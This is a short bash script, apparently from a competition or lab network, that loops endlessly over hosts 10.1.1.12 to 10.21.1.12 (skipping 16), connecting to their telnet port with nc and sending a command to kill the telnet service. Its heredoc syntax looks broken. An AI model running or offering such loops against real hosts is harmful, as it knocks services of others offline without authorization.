while true; do
  for i in {1..21}; do
    if [[ $i -ne 16 ]]; then
      expect << EOF
	  nc 10.$i.1.12 23
	  killall telnetd.exe telnet.exe
	  EOF
	fi
  done
done

